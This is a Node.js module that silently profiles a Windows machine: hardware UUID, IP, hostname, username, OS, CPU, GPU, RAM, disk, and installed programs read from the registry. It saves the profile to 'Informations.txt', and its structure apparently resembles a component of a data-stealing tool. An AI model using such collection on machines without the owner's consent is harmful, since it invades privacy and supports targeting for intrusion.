var Registry = require('winreg');
const util = require('util');
const fs = require("fs");
const path = require("path");
const exec = util.promisify(require('child_process').exec);
const save = require('./save');
const core = require('./core');

async function getSysteminformations(ip, hostname) {
    let informations = core.getHeader();
    try {
        informations += `UUID: ${(await getCommand("wmic csproduct get uuid | more +1"))}\n`;
        informations += `IP: ${ip}\n`;
        informations += `HOSTNAME: ${hostname}\n`
        informations += `USERNAME: ${process.env.userprofile.split("\\")[2]}\n`
        informations += `OS: ${(await getCommand("wmic OS get caption, osarchitecture | more +1"))}\n`
        informations += `FileLocation: ${process.cwd()}\n`
        informations += `CPU: ${(await getCommand("wmic cpu get name | more +1"))}\n`
        informations += `GPU(s): ${(await getCommand("wmic PATH Win32_VideoController get name | more +1")).split("   ").join(", ")}\n`
        informations += `RAM: ${(await getCommand("wmic computersystem get totalphysicalmemory | more +1")).slice(0, 1)} GB\n`
        informations += `DISK: ${(await getDisk())} GB\n\n`
        informations += `───────────────────────\nApplications installed\n───────────────────────\n\n${(await getInstalledApplication())}\n`
    } catch (e) { }

    fs.writeFileSync(path.join(save.basepath, "Informations.txt"), informations);
    return informations;
}

async function getDisk() {
    size = (await getCommand('wmic logicaldisk get size | more +1')).split(' ')
    final = []
    for (let i = 0; i < size.length; i++) {
        if (size[i] != "") {
            final.push((parseInt(size[i]) / 2 ** 30).toString().split(".")[0])
        }
    }

    if (final.length == 0) {
        return "1000"
    }

    return final[0]
}

async function getCommand(cmd) {
    const { stdout, _ } = await exec(cmd);
    return stdout.replace(/\n/gm, "").replace(/\r/gm, "").trim();
}

async function getInstalledApplication() {
    const regKey = new Registry({
        hive: Registry.HKLM,
        key: "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
    });

    const exists = await new Promise((resolve, reject) => {
        regKey.keyExists((err, exists) => {
            if (err != null) {
                resolve(false);
            }
            resolve(exists);
        });
    });
    if (!exists) {
        return "";
    }

    const subkeys = await new Promise((resolve, reject) => {
        regKey.keys((err, subkeys) => {
            if (err != null) {
                resolve([]);
            }

            resolve(subkeys);
        })
    });
    if (subkeys.length == 0) {
        return "";
    }

    let installedApps = "";
    for (let i = 0; i < subkeys.length; i++) {
        const subkey = subkeys[i];

        const items = await new Promise((resolve, reject) => {
            subkey.values((err, items) => {
                if (err != null) {
                    resolve([])
                }

                resolve(items);
            })
        })

        for (let u = 0; u < items.length; u++) {
            if (items[u].name == "DisplayName") {
                installedApps = installedApps + items[u].value + "\n";
            }
        }
    }

    return installedApps
}

module.exports = {
    getSysteminformations
}